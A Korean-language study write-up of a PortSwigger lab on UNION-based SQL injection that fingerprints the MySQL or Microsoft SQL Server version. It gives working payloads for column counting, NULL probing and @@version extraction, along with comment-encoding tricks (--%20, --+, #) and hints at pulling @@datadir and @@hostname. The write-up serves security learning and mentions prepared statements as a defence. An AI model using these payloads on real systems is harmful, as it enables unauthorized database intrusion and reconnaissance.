# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — UNION Attack / Database Fingerprinting
- **링크**: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet

## 목표

UNION 기반 SQL injection으로 MySQL 또는 Microsoft SQL Server의 버전 정보를 화면에 출력한다.

## 003 랩과의 차이점

003 랩(Oracle)과 동일하게 UNION SELECT를 사용하지만, DBMS가 다르므로 두 가지가 달라진다.

| 항목 | Oracle (003) | MySQL / MSSQL (004) |
|------|-------------|---------------------|
| FROM 절 | `FROM DUAL` 필수 | 생략 가능 |
| 버전 쿼리 | `SELECT BANNER FROM v$version` | `SELECT @@version` |
| `--` 주석 | `--` 단독 사용 가능 | `--` 뒤에 **공백 필수** |

## 분석

003 랩에서 학습한 UNION 공격 절차(컬럼 수 파악 → NULL 검증 → 데이터 추출)를 그대로 활용한다. 단, MySQL에서 `--` 주석이 제대로 동작하려면 반드시 뒤에 공백이 있어야 한다.

```sql
--      ← MySQL에서 주석으로 인식 안 될 수 있음
-- 　   ← 뒤에 공백이 있어야 주석으로 인식
```

## 풀이

### 1단계 — 컬럼 수 파악 (ORDER BY)

```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--    ← 에러 발생
```

`ORDER BY 3`에서 에러가 발생하면 컬럼 수는 **2개**다.

> `--` 뒤에 공백을 붙여야 하므로 페이로드 끝에 공백을 포함해야 한다.

### 2단계 — 컬럼 수 및 타입 검증 (UNION SELECT NULL)

```sql
' UNION SELECT NULL,NULL-- 
```

Oracle과 달리 `FROM DUAL` 없이 NULL만으로 검증한다.

### 3단계 — 문자열 출력 가능한 컬럼 확인

```sql
' UNION SELECT 'a',NULL-- 
' UNION SELECT NULL,'a'-- 
```

### 4단계 — 버전 정보 추출

MySQL과 MSSQL 모두 `@@version` 시스템 변수로 버전 정보를 조회할 수 있다.

```sql
' UNION SELECT @@version,NULL-- 
```

응답 예시 (MySQL):

```
8.0.32-MySQL Community Server - GPL
```

응답 예시 (MSSQL):

```
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
```

### 공백 처리 — `%20` URL 인코딩

`--` 뒤의 공백은 브라우저와 Burp Suite가 자동으로 제거하는 경우가 있다. URL 인코딩을 사용해 공백을 명시적으로 전달한다.

```
' UNION SELECT @@version,NULL--%20
```

| 표현 | 설명 |
|------|------|
| `-- ` (공백) | 브라우저/Burp Suite가 trailing space를 제거할 수 있음 |
| `--%20` | URL 인코딩된 공백으로 서버까지 확실히 전달 |
| `--+` | `+`가 공백으로 디코딩되는 환경(form 데이터)에서 사용 |

## 핵심 정리

- MySQL에서 `--` 주석은 **뒤에 공백이 반드시 필요**하다. 공백 없이 `--`만 사용하면 주석으로 인식되지 않아 쿼리가 의도대로 동작하지 않는다.
- 브라우저와 Burp Suite는 trailing space를 제거할 수 있으므로, `--%20`으로 URL 인코딩해서 공백을 보존해야 한다.
- MySQL과 MSSQL의 버전 정보는 `@@version` 시스템 변수로 조회한다.
- Oracle과 달리 `FROM` 절 없이 `SELECT @@version`만으로 사용 가능하다.
- **방어**: Prepared Statement 사용, 에러 메시지 및 버전 정보 노출 차단.

## 배운 점 및 추가 학습

### 1. DBMS별 주석 구문 총정리

003 랩에서 정리한 내용에 MySQL의 공백 요건을 보완한다.

| DBMS | 라인 주석 | 블록 주석 | 주의사항 |
|------|-----------|-----------|----------|
| Oracle | `--` | `/* */` | `FROM DUAL` 필수 |
| MySQL | `-- ` (공백 필수), `#` | `/* */` | trailing space 주의 → `%20` 사용 |
| MSSQL | `--` | `/* */` | 공백 불필요 |
| PostgreSQL | `--` | `/* */` | 공백 불필요 |

### 2. trailing space 제거 문제와 우회

브라우저와 Burp Suite가 URL의 trailing space를 자동 제거하는 동작은 예상치 못한 실패 원인이 된다.

```
페이로드 의도:  ' UNION SELECT @@version,NULL-- 
실제 전송:      ' UNION SELECT @@version,NULL--     ← 공백 제거됨
결과:           -- 가 주석으로 인식되지 않아 쿼리 에러
```

**우회 방법 비교**

| 방법 | 페이로드 | 사용 환경 |
|------|----------|-----------|
| URL 인코딩 | `--%20` | URL 파라미터 (가장 범용) |
| `+` 사용 | `--+` | HTML form POST (application/x-www-form-urlencoded) |
| `#` 사용 | `#` | MySQL 전용, URL에서는 `%23` |

### 3. DBMS별 버전 쿼리 총정리 (003 보완)

| DBMS | 버전 쿼리 | FROM 절 필요 |
|------|-----------|-------------|
| Oracle | `SELECT BANNER FROM v$version` | 필수 (`FROM v$version`) |
| MySQL | `SELECT @@version` | 불필요 |
| MSSQL | `SELECT @@version` | 불필요 |
| PostgreSQL | `SELECT version()` | 불필요 |

### 4. 추가로 고민해볼 것

- `@@version` 외에도 `@@datadir`(MySQL 데이터 디렉토리), `@@hostname` 등의 시스템 변수로 추가 정보를 추출할 수 있다.
- DBMS 식별이 불확실할 때 `@@version`과 `version()`을 모두 시도해보는 것이 효율적이다.
- `--+`는 POST body에서만 유효하고 URL 파라미터에서는 `+`가 공백으로 디코딩되지 않을 수 있으므로 상황에 맞게 선택해야 한다.
